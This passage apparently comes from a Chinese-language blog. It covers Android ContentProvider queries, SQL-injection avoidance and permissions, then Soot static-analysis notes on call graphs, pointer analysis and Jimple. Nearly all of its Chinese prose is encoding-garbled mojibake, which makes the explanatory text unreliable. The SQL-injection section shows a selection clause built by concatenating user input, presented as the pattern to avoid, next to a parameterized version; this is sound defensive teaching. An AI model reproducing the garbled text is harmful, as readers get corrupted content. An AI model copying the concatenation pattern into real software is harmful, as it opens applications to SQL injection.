<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Queries the user dictionary and returns results</span></span><br><span class="line">cursor = getContentResolver().query(</span><br><span class="line">    UserDictionary.Words.CONTENT_URI,   <span class="comment">// The content URI of the words table</span></span><br><span class="line">    projection,                        <span class="comment">// The columns to return for each row</span></span><br><span class="line">    selectionClause,                   <span class="comment">// Selection criteria</span></span><br><span class="line">    selectionArgs,                     <span class="comment">// Selection criteria</span></span><br><span class="line">    sortOrder);                        <span class="comment">// The sort order for the returned rows</span></span><br></pre></td></tr></table></figure>

<p><code>query()</code>ä¸ <code>sql</code>æŸ¥è¯¢çš„æ¯”è¾ƒï¼š</p>
<table>
<thead>
<tr>
<th align="center">query() å‚æ•°</th>
<th align="center">SELECT å…³é”®å­—&#x2F;å‚æ•°</th>
<th align="center">å¤‡æ³¨</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>Uri</code></td>
<td align="center"><code>FROM table_name</code></td>
<td align="center"><code>Uri</code> æ˜ å°„è‡³æä¾›ç¨‹åºä¸­åä¸º table_name çš„è¡¨ã€‚</td>
</tr>
<tr>
<td align="center"><code>projection</code></td>
<td align="center"><code>col,col,col,...</code></td>
<td align="center"><code>projection</code> æ˜¯æ£€ç´¢åˆ°çš„æ¯ä¸ªè¡Œæ‰€åº”åŒ…å«çš„åˆ—çš„æ•°ç»„ã€‚</td>
</tr>
<tr>
<td align="center"><code>selection</code></td>
<td align="center"><code>WHERE col = value</code></td>
<td align="center"><code>selection</code> æŒ‡å®šé€‰æ‹©è¡Œçš„æ¡ä»¶ã€‚</td>
</tr>
<tr>
<td align="center"><code>selectionArgs</code></td>
<td align="center">ï¼ˆæ²¡æœ‰å®Œå…¨ç­‰æ•ˆé¡¹ï¼Œé€‰æ‹©å‚æ•°ä¼šæ›¿æ¢é€‰æ‹©å­å¥ä¸­çš„ <code>?</code> å ä½ç¬¦ã€‚ï¼‰</td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><code>sortOrder</code></td>
<td align="center"><code>ORDER BY col,col,...</code></td>
<td align="center"><code>sortOrder</code> æŒ‡å®šåœ¨è¿”å›çš„ <code>Cursor</code> ä¸­å„è¡Œçš„æ˜¾ç¤ºé¡ºåºã€‚</td>
</tr>
</tbody></table>
<h2 id="è§„é¿SQLæ³¨å…¥çš„æ–¹å¼"><a href="#è§„é¿SQLæ³¨å…¥çš„æ–¹å¼" class="headerlink" title="è§„é¿SQLæ³¨å…¥çš„æ–¹å¼"></a>è§„é¿SQLæ³¨å…¥çš„æ–¹å¼</h2><p>å¯¹SQLè¯­å¥çš„æ“ä½œä¸è¦ä½¿ç”¨ä¸²è”çš„æ–¹å¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Constructs a selection clause by concatenating the user&#x27;s input to the column name</span></span><br><span class="line"><span class="type">String</span> <span class="variable">selectionClause</span> <span class="operator">=</span> <span class="string">&quot;var = &quot;</span> + userInput;</span><br></pre></td></tr></table></figure>

<p>åº”è¯¥ä½¿ç”¨å ä½ç¬¦ä¸å•ç‹¬çš„æŸ¥è¯¢å‚æ•°ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Constructs a selection clause with a replaceable parameter</span></span><br><span class="line"><span class="type">String</span> <span class="variable">selectionClause</span> <span class="operator">=</span>  <span class="string">&quot;var = ?&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Defines an array to contain the selection arguments</span></span><br><span class="line">String[] selectionArgs = &#123;<span class="string">&quot;&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sets the selection argument to the user&#x27;s input</span></span><br><span class="line">selectionArgs[<span class="number">0</span>] = userInput;</span><br></pre></td></tr></table></figure>

<h2 id="æƒé™"><a href="#æƒé™" class="headerlink" title="æƒé™"></a>æƒé™</h2><p>æŸ¥è¯¢åˆ†ä¸ºä¸¤æ­¥ï¼š</p>
<ol>
<li>è¯·æ±‚å¯¹æä¾›ç¨‹åºçš„è¯»å–è®¿é—®æƒé™ã€‚</li>
<li>å°†æ“ä½œè¯­å¥å‘é€è‡³æä¾›ç¨‹åºã€‚</li>
</ol>
<p>å¯¹ <code>ContentProvider</code>çš„è®¿é—®æƒé™æ˜¯åœ¨åº”ç”¨ç¨‹åºçš„ <code>&lt;use-permission&gt;</code>ä¸­æŒ‡å®šçš„ï¼Œæ— æ³•åŠ¨æ€ç”³è¯·ã€‚</p>
<p>å¦‚æœä»…ä½¿ç”¨ <code>ContentProvider</code>åœ¨è‡ªå·±çš„åº”ç”¨ä¹‹é—´å…±äº«æ•°æ®ï¼Œæœ€å¥½å°†ä½¿ç”¨çš„ <code>android:protectionLevel </code>å±æ€§è®¾ç½®ä¸º <code>signature</code> ä¿æŠ¤çº§åˆ«ã€‚</p>
<p>è¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æä¾›æ›´ç»†åŒ–çš„è®¿é—®æƒé™ï¼šå£°æ˜ <code>android:grantUriPermissions</code>å±æ€§ï¼Œå¹¶ä½¿ç”¨ç”¨æ¥å¯åŠ¨ç»„ä»¶çš„ <code>Intent</code>å¯¹è±¡ä¸­çš„ <code>FLAG_GRANT_READ_URI_PERMISSION</code>å’Œ <code>FLAG_GRANT_WRITE_URI_PERMISSION</code>æ ‡è®°ã€‚</p>
<ul>
<li><code>android:grantUriPermissions</code> : é»˜è®¤ä¸º <code>false</code>, å½“ä¸º <code>false</code>æ—¶éœ€è¦å¢åŠ  <code>&lt;grant-uri-permission&gt;</code>æ¥æŒ‡å®šå…è®¸ä¸´æ—¶æƒé™è®¿é—®çš„å…·ä½“ <code>Content URI</code>, è®¾ç½®ä¸º <code>true</code>æ—¶è¡¨ç¤ºæ•´ä¸ª <code>Provider</code>éƒ½æ¥å—ä¸´æ—¶æƒé™è®¿é—®æ•°æ®ã€‚</li>
<li><code>&lt;grant-uri-permission&gt;</code> : ç”¨äºæŒ‡å®šå…·ä½“çš„ <code>Content URI</code>, å’Œ <code>Path-level</code>æƒé™çš„ <code>&lt;path-permisson&gt;</code>ç±»ä¼¼ã€‚</li>
<li><code>FLAG_GRANT_READ_URI_PERMISSION</code>å’Œ <code>FLAG_GRANT_WRITE_URI_PERMISSION</code> : é…åˆ <code>Intent.setFlags</code>è®© <code>Intent</code>ä¸­çš„ <code>URI</code>èƒ½å¤Ÿè¢«æ— æƒé™çš„ <code>app</code>ä¸´æ—¶è®¿é—®ã€‚</li>
<li>æ²¡æœ‰<code>&lt;path-permisson&gt;</code>çš„ï¼Œå°±æ˜¯æ²¡æœ‰è®¿é—®æƒé™ã€‚</li>
</ul>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a target="_blank" rel="noopener" href="https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/">https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/</a></p>
<p><a target="_blank" rel="noopener" href="https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/">https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-12T09:30:00.000Z" title="2022/6/12 17:30:00">2022-06-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-12T09:40:33.626Z" title="2022/6/12 17:40:33">2022-06-12</time></span><span class="level-item">23 minutes read (About 3379 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/12/Soot%E7%AC%94%E8%AE%B0/">Sootç¬”è®°</a></p><div class="content"><h1 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h1><p>ç»™å®šä¸€ä¸ªè¾“å…¥ç¨‹åºï¼Œè¾“å‡ºç¨‹åºçš„å±æ€§ã€‚</p>
<h2 id="Rice-å®šå¾‹"><a href="#Rice-å®šå¾‹" class="headerlink" title="Rice å®šå¾‹"></a>Rice å®šå¾‹</h2><p>åœ¨ä¸€ä¸ªå³<strong>é€’å½’å¯æšä¸¾</strong>(recursively enumerable)è¯­è¨€ä¸­ï¼Œä»»ä½•ç¨‹åºè¡Œä¸ºçš„ <strong>non-trivial</strong> å±æ€§éƒ½æ˜¯ä¸å¯è§£é‡Šçš„ã€‚<strong>non-trivial</strong> å±æ€§æŒ‡çš„æ˜¯é‚£äº›ä¸ç¨‹åºè¿è¡Œè¡Œä¸ºæœ‰å…³çš„å±æ€§ã€‚</p>
<p>å³<strong>ä¸å­˜åœ¨å®Œç¾çš„é™æ€åˆ†æ</strong>ã€‚</p>
<img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202140954018.png-water_print" style="zoom: 33%;" />

<p>å›½å†…è¯¾ç¨‹ï¼š<a target="_blank" rel="noopener" href="https://xiongyingfei.github.io/SA/2021/main.htm">åŒ—å¤§ç†Šè‹±é£</a>ã€<a target="_blank" rel="noopener" href="https://pascal-group.bitbucket.io/teaching.html">å—å¤§</a>åŠå—å¤§Bç«™çš„<a target="_blank" rel="noopener" href="https://space.bilibili.com/2919428">è§†é¢‘</a>ã€‚</p>
<h2 id="è°ƒç”¨å›¾"><a href="#è°ƒç”¨å›¾" class="headerlink" title="è°ƒç”¨å›¾"></a>è°ƒç”¨å›¾</h2><p>ä¸€ä¸ªè°ƒç”¨å›¾å°±æ˜¯ä»è°ƒç”¨ç‚¹åˆ°ç›®æ ‡æ–¹æ³•çš„<strong>ä¸€ç³»åˆ—è°ƒç”¨è¾¹</strong>ã€‚</p>
<p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202190937291.png-water_print" alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202190937291.png-water_print"></p>
<h2 id="ç®—æ³•"><a href="#ç®—æ³•" class="headerlink" title="ç®—æ³•"></a>ç®—æ³•</h2><h3 id="CHA"><a href="#CHA" class="headerlink" title="CHA"></a>CHA</h3><p>è®ºæ–‡<a target="_blank" rel="noopener" href="http://web.cs.ucla.edu/~palsberg/tba/papers/dean-grove-chambers-ecoop95.pdf">åœ°å€</a>ã€‚</p>
<h4 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h4><ul>
<li>éœ€è¦é¦–å…ˆè·å¾—æ•´ä¸ªç¨‹åºçš„ç±»ç»§æ‰¿å…³ç³»å›¾</li>
<li>é€šè¿‡æ¥æ”¶å˜é‡çš„å£°æ˜ç±»å‹æ¥è§£æ Virtual call<ul>
<li>æ¥æ”¶å˜é‡çš„ä¾‹å­ï¼šåœ¨ <code>a.foo()</code> ä¸­ï¼Œa å°±æ˜¯æ¥æ”¶å˜é‡</li>
</ul>
</li>
<li>å‡è®¾ä¸€ä¸ªæ¥æ”¶å˜é‡èƒ½å¤ŸæŒ‡å‘ A æˆ– A çš„æ‰€æœ‰å­ç±»</li>
</ul>
<h4 id="å…·ä½“è¿‡ç¨‹"><a href="#å…·ä½“è¿‡ç¨‹" class="headerlink" title="å…·ä½“è¿‡ç¨‹"></a>å…·ä½“è¿‡ç¨‹</h4><p>é€šè¿‡ CHA ç®—æ³•å¯»æ‰¾åˆ°æŸä¸ªç¨‹åºè°ƒç”¨ç‚¹å¯¹åº”çš„å¯èƒ½çš„ç›®æ ‡å‡½æ•°å®ä½“ã€‚</p>
<img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202191001784.png-water_print" alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202202191001784.png-water_print" style="zoom:50%;" />

<ul>
<li>call site(cs) å°±æ˜¯è°ƒç”¨è¯­å¥ï¼Œm(method) å°±æ˜¯å¯¹åº”çš„å‡½æ•°ç­¾åã€‚</li>
<li>T é›†åˆä¸­ä¿å­˜æ‰¾åˆ°çš„ç»“æœ</li>
</ul>
<h4 id="static-call"><a href="#static-call" class="headerlink" title="static call"></a>static call</h4><p>é™æ€æ–¹æ³•è°ƒç”¨å‰å†™çš„æ˜¯ç±»åï¼Œè€Œéé™æ€æ–¹æ³•è°ƒç”¨å‰å†™çš„æ˜¯å˜é‡æˆ–æŒ‡é’ˆåã€‚é™æ€æ–¹æ³•è°ƒç”¨ä¸éœ€è¦ä¾èµ–å®ä¾‹ï¼Œæ‰€ä»¥ç›´æ¥åŠ åˆ°é›†åˆ T ä¸­ã€‚</p>
<h4 id="special-call"><a href="#special-call" class="headerlink" title="special call"></a>special call</h4><p>ä½¿ç”¨ <code>super</code> ç±»çš„è°ƒç”¨æ–¹æ³•ã€‚<code>foo()</code> è™½ç„¶åœ¨å½“å‰ç±»æœ‰å®šä¹‰ï¼Œä½†æ˜¯å®é™…ä½¿ç”¨çš„æ˜¯çˆ¶ç±»çš„ <code>foo()</code>ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ <code>Dispatch</code> å‡½æ•°ã€‚å…¶ä¸­çš„ <code>foo()</code> çš„ç­¾å <code>m</code> ç”±ç¼–è¯‘å™¨è¿”å›ä¿¡æ¯å¯çŸ¥æ˜¯çˆ¶ç±» <code>B</code> çš„ï¼Œé‚£ä¹ˆè·å– <code>foo()</code> è¿”å›å€¼çš„ <code>c</code> ä¹ŸæŒ‡å‘ <code>B</code>ï¼Œä¹Ÿå°±ç›¸å½“äºåœ¨çˆ¶ç±»ä¸­å¯»æ‰¾äº†ã€‚</p>
<h4 id="virtual-call"><a href="#virtual-call" class="headerlink" title="virtual call"></a>virtual call</h4><p>è¿™æ˜¯<code>CHA</code> åŒºåˆ«äºå…¶ä»–ç®—æ³•çš„ä¸»è¦ä¹‹å¤„ã€‚è¯¥ç®—æ³•ä¼šå¯¹æ­¤æ–¹æ³•åšä¸€ä¸ª <code>Dispatch(c,m)</code> å¹¶å°† <code>c</code> çš„æ‰€æœ‰å­é›†ä»¥åŠå­é›†çš„å­é›†å…¨éƒ½åšä¸€æ¬¡ <code>Dispatch(c&#39;, m)</code>ã€‚ç›´è§‚æ¥çœ‹ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ˜¯å¯¹æœ¬èº«åšä¸€æ¬¡ <code>Dispatch</code>ï¼Œçœ‹çœ‹å½“å‰ç±»ä¸­æ˜¯å¦æœ‰ <code>foo()</code>ï¼Œæ²¡æœ‰çš„è¯å°±åˆ°çˆ¶ç±»ä¸­é€’å½’åœ°æ‰¾ï¼›ç¬¬äºŒæ­¥æ˜¯åœ¨å½“å‰ç±»åœ°æ‰€æœ‰å­é›†ä¸­æ‰¾åˆ°æ‰€æœ‰çš„ <code>foo()</code>ï¼Œç„¶åå°†è¿™äº› <code>foo</code> åŒç¬¬ä¸€æ­¥æ‰¾åˆ°çš„ <code>foo</code> å…¨éƒ½åŠ å…¥ <code>T</code> ä¸­ã€‚</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/picture3.png" alt="2022-06-01-8.47.38" style="zoom:50%;" />

<p>ä¸€ä¸ªğŸŒ°ï¼š</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/picture2.png" alt="2022-06-01-8.49.48" style="zoom:50%;" />

<h4 id="CHA-çš„ç‰¹å¾"><a href="#CHA-çš„ç‰¹å¾" class="headerlink" title="CHA çš„ç‰¹å¾"></a>CHA çš„ç‰¹å¾</h4><ol>
<li>åªè€ƒè™‘ç±»ç»§æ‰¿ç»“æ„ï¼Œæ‰€ä»¥<strong>å¾ˆå¿«</strong></li>
<li>å› ä¸ºå¿½ç•¥äº†æ•°æ®æµå’Œæ§åˆ¶æµçš„ä¿¡æ¯ï¼Œæ‰€ä»¥<strong>ä¸å¤ªå‡†ç¡®</strong></li>
</ol>
<h3 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h3><p>è®ºæ–‡<a target="_blank" rel="noopener" href="https://plg.uwaterloo.ca/~olhotak/pubs/sable-paper-2003-1.ps">åœ°å€</a>ã€‚</p>
<p>é€šè¿‡ä½¿ç”¨ <code>PointsTo Analysis</code> æ‰¾åˆ°å˜é‡çš„å®é™…ç±»å‹æ¥å‡†ç¡®åœ°å¤„ç†è¿™ç§æƒ…å†µã€‚ä¸ <code>CHA</code> ç›¸æ¯”ï¼Œ<code>SPARK</code> å»é™¤äº†è®¸å¤šè™šå‡è¾¹ç¼˜ï¼›ä½†æ˜¯ï¼Œå®ƒè¦æ…¢å¾—å¤šï¼Œå¹¶ä¸”å¯èƒ½ä¼šæ¼æ‰ä¸€äº›çœŸæ­£çš„è¾¹ã€‚</p>
<h2 id="æŒ‡é’ˆåˆ†æ"><a href="#æŒ‡é’ˆåˆ†æ" class="headerlink" title="æŒ‡é’ˆåˆ†æ"></a>æŒ‡é’ˆåˆ†æ</h2><h3 id="æŒ‡é’ˆåˆ†æè¦è§£å†³çš„é—®é¢˜"><a href="#æŒ‡é’ˆåˆ†æè¦è§£å†³çš„é—®é¢˜" class="headerlink" title="æŒ‡é’ˆåˆ†æè¦è§£å†³çš„é—®é¢˜"></a>æŒ‡é’ˆåˆ†æè¦è§£å†³çš„é—®é¢˜</h3><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/picture1.png" alt="2022-05-30-9.32.31" style="zoom:50%;" />

<p>ç¨‹åºä¸­çš„æŒ‡é’ˆæŒ‡å‘å“ªä¸ªå†…å­˜çš„é—®é¢˜ï¼Œ<code>Java</code>è¯­è¨€ä¸­çš„æŒ‡é’ˆåˆ†ææŒ‡çš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ç¨‹åºä¸­çš„å“ªä¸ªå¯¹è±¡ï¼ˆ<code>Object</code>)çš„é—®é¢˜ã€‚é€šå¸¸æŒ‡é’ˆåˆ†ææ˜¯ä¸€ä¸ª<code>may-analysis</code>ï¼Œåˆ†æçš„ç»“æœé€šå¸¸æ˜¯ä¸€ä¸ªæŒ‡é’ˆ<strong>å¯èƒ½</strong>æŒ‡å‘å“ªäº›å¯¹è±¡ã€‚</p>
<h3 id="æŒ‡é’ˆåˆ†æçš„åº”ç”¨"><a href="#æŒ‡é’ˆåˆ†æçš„åº”ç”¨" class="headerlink" title="æŒ‡é’ˆåˆ†æçš„åº”ç”¨"></a>æŒ‡é’ˆåˆ†æçš„åº”ç”¨</h3><ul>
<li>å¯ä»¥ç”¨æ¥è®¡ç®—å…¶ä»–åŸºæœ¬ä¿¡æ¯ï¼ˆåˆ«ååˆ†æï¼Œè°ƒç”¨å›¾â€¦)ã€‚</li>
<li>ç¼–è¯‘ä¼˜åŒ–ã€‚</li>
<li>æ‰¾Bugã€‚</li>
<li>å®‰å…¨æ€§åˆ†æã€‚</li>
<li>â€¦â€¦</li>
</ul>
<p>æŒ‡é’ˆåˆ†ææ˜¯æœ€åŸºç¡€çš„é™æ€åˆ†æä¹‹ä¸€ï¼Œä¹Ÿæ˜¯å¾ˆå¤šå…¶ä»–åˆ†æçš„åŸºç¡€ã€‚</p>
<h1 id="Soot"><a href="#Soot" class="headerlink" title="Soot"></a>Soot</h1><p><code>soot</code>æœ‰å¾ˆå¤š<code>Option</code>é…ç½®ï¼Œå¯ä»¥å‚è€ƒ<a target="_blank" rel="noopener" href="https://soot-oss.github.io/soot/docs/4.4.0-SNAPSHOT/options/soot_options.html#options">è¿™é‡Œ</a>æˆ–è€…<a target="_blank" rel="noopener" href="https://github.com/Sable/soot/wiki/Introduction:-Soot-as-a-command-line-tool">è¿™é‡Œ</a>ã€‚</p>
<h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><h3 id="Jimple"><a href="#Jimple" class="headerlink" title="Jimple"></a>Jimple</h3><p>ä»‹äº <code>Java</code> å’Œ <code>Java</code> å­—èŠ‚ç ä¹‹é—´ï¼Œæ˜¯ä¸€ä¸ªåŸºäºè¯­å¥çš„ã€ç±»å‹åŒ–çš„ï¼ˆæ¯ä¸ªå˜é‡éƒ½æœ‰ä¸€ä¸ªç±»å‹ï¼‰å’Œ <code>3-addressed</code>ï¼ˆæ¯æ¡è¯­å¥æœ€å¤šæœ‰ 3 ä¸ªå˜é‡ï¼‰çš„ä¸­é—´è¡¨ç¤ºã€‚</p>
<blockquote>
<p>ä¸‰åœ°å€ç ï¼Œä¸€æ¡æŒ‡ä»¤çš„å³ä¾§æœ€å¤šåªæœ‰ä¸€ä¸ªè¿ç®—ç¬¦ï¼Œå¦‚ <code>x+y*z</code>è¡¨ç¤ºä¸ºï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t1 = y*z;</span><br><span class="line">t2 = x + t1;</span><br><span class="line">x = t2;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>è°ƒç”¨æ–¹æ³•ï¼š</p>
<ul>
<li><code>specialinvoke</code>ï¼šç”¨äºè°ƒç”¨æ„é€ æ–¹æ³•ã€çˆ¶ç±»æ–¹æ³•ã€ç§æœ‰æ–¹æ³•ã€‚</li>
<li><code>virtualinvoke</code>ï¼šç”¨äºè°ƒç”¨æ™®é€šçš„æˆå‘˜æ–¹æ³•ï¼Œè¿›è¡Œ<code>virtual dispatch</code>ã€‚</li>
<li><code>interfaceinvoke</code>ï¼šç”¨äºè°ƒç”¨ç»§æ‰¿çš„æ¥å£çš„æ–¹æ³•ï¼Œä¸èƒ½åšä¼˜åŒ–ï¼Œéœ€è¦æ£€æŸ¥æ˜¯å¦å®ç°äº†æ¥å£ä¸­çš„æ–¹æ³•ã€‚</li>
<li><code>staticinvoke</code>ï¼šç”¨äºè°ƒç”¨é™æ€æ–¹æ³•ã€‚</li>
</ul>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) r0 := <span class="meta">@this</span>: FizzBuzz</span><br><span class="line">(<span class="number">2</span>) i0 := <span class="meta">@parameter0</span>: <span class="type">int</span></span><br><span class="line">(<span class="number">3</span>) $i1 = i0 % <span class="number">15</span></span><br><span class="line">(<span class="number">4</span>) <span class="keyword">if</span> $i1 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$i2</span> <span class="operator">=</span> i0 % <span class="number">5</span></span><br><span class="line">(<span class="number">5</span>) $r4 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">6</span>) virtualinvoke $r4.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;FizzBuzz&quot;</span>) <span class="comment">// å°–æ‹¬å·å†…çš„æ˜¯æ–¹æ³•ç­¾å</span></span><br><span class="line">(<span class="number">7</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">8</span>) $i2 = i0 % <span class="number">5</span></span><br><span class="line">(<span class="number">9</span>) <span class="keyword">if</span> $i2 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$i3</span> <span class="operator">=</span> i0 % <span class="number">3</span></span><br><span class="line">(<span class="number">10</span>) $r3 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">11</span>) virtualinvoke $r3.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;Buzz&quot;</span>)</span><br><span class="line">(<span class="number">12</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">13</span>) $i3 = i0 % <span class="number">3</span></span><br><span class="line">(<span class="number">14</span>) <span class="keyword">if</span> $i3 != <span class="number">0</span> <span class="type">goto</span> <span class="variable">$r1</span> <span class="operator">=</span> &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">15</span>) $r2 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">16</span>) virtualinvoke $r2.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(java.lang.String)</span>&gt;(<span class="string">&quot;Fizz&quot;</span>)</span><br><span class="line">(<span class="number">17</span>) <span class="keyword">goto</span> [?= <span class="keyword">return</span>]</span><br><span class="line">(<span class="number">18</span>) $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;</span><br><span class="line">(<span class="number">19</span>) virtualinvoke $r1.&lt;java.io.PrintStream: <span class="keyword">void</span> <span class="title function_">println</span><span class="params">(<span class="type">int</span>)</span>&gt;(i0)</span><br><span class="line">(<span class="number">20</span>) <span class="keyword">return</span></span><br></pre></td></tr></table></figure>

<h3 id="Shimple"><a href="#Shimple" class="headerlink" title="Shimple"></a>Shimple</h3><p>ä¸<code>Jimple</code>åŸºæœ¬ç›¸åŒï¼Œæ˜¯<code>Jimple</code>é™æ€å•ä»»åŠ¡å½¢å¼çš„ä¸­é—´è¡¨ç¤ºã€‚</p>
<h3 id="Baf"><a href="#Baf" class="headerlink" title="Baf"></a>Baf</h3><p>æ˜¯æµçº¿å‹çš„åŸºäºæ ˆçš„å­—èŠ‚è¡¨ç¤ºã€‚å°†<code>java</code>å­—èŠ‚ç è½¬ä¸ºåŸºäºæ ˆçš„ä»£ç ã€‚</p>
<h3 id="Grimp"><a href="#Grimp" class="headerlink" title="Grimp"></a>Grimp</h3><p>ä¸<code>Jimple</code> ç±»ä¼¼ï¼Œæ¯”<code>Jimple</code>æ›´æ¥è¿‘äº<code>java</code>æºç ã€‚å®¹æ˜“é˜…è¯»ï¼Œæ–¹ä¾¿äººå·¥é˜…è¯»ã€‚</p>
<h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><p>åŸºæœ¬çš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š</p>
<ul>
<li><p><code>Scene</code>ï¼Œæ˜¯ä¸€ä¸ªå•ä¾‹ç±»ï¼Œè¡¨ç¤ºæ‰€åˆ†æçš„ç¯å¢ƒã€‚</p>
</li>
<li><p><code>SootClass</code>ï¼Œç”¨äºè¡¨ç¤º<code>Scene</code>ä¸­çš„ç±»ã€‚</p>
</li>
<li><p><code>SootMethod</code>ï¼Œç”¨äºè¡¨ç¤º<code>SootClass</code>ä¸­çš„æ–¹æ³•ã€‚</p>
</li>
<li><p><code>Body</code>ï¼Œä½¿ç”¨<code>Body</code>æ¥è®¿é—®<code>SootMethod</code>ä¸­çš„å„ç§ä¿¡æ¯ï¼Œæ¯ä¸ª<code>Body</code>é‡Œé¢æœ‰ä¸‰ä¸ªä¸»é“¾ï¼Œåˆ†åˆ«æ˜¯<code>Units</code>é“¾ã€<code>Locals</code>é“¾ã€<code>Traps</code>é“¾ã€‚ã€‚</p>
<ul>
<li><code>Localï¼Œ</code>æ–¹æ³•å†…çš„å±€éƒ¨å˜é‡ã€‚</li>
<li><code>Trap</code>ï¼Œæ–¹æ³•å†…çš„å¼‚å¸¸å¤„ç†ã€‚</li>
<li><code>Unit</code>ï¼Œæ–¹æ³•ä½“å†…çš„è¯­å¥ã€‚</li>
</ul>
</li>
</ul>
<p>è¿˜æœ‰å››ç§<code>Body</code>ï¼Œå¯¹åº”å››ç§ä¸­é—´è¡¨ç¤ºï¼š<code>BafBody</code>ã€<code>JimpleBody</code>ã€<code>ShimpleBody</code>ã€<code>GrimpBody</code>ï¼Œ<code>Soot</code> ä¸­çš„é»˜è®¤ <code>IR</code> æ˜¯ **<code>Jimple</code>**ï¼ˆ<code>Java Simple</code>ï¼‰ã€‚</p>
<h3 id="Unitï¼ˆJimpleä¸­æ˜¯Stmtï¼‰"><a href="#Unitï¼ˆJimpleä¸­æ˜¯Stmtï¼‰" class="headerlink" title="Unitï¼ˆJimpleä¸­æ˜¯Stmtï¼‰"></a>Unitï¼ˆJimpleä¸­æ˜¯Stmtï¼‰</h3><p>è¡¨ç¤º<code>Unit</code>è¯­å¥ã€‚ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p>
<ul>
<li>æ ¸å¿ƒè¯­å¥ï¼š<code>NopStmt</code>ï¼Œ <code>DefinitionStmt</code>(<code>IdentityStmt</code>ï¼Œ <code>AssignStmt</code>)ã€‚<ul>
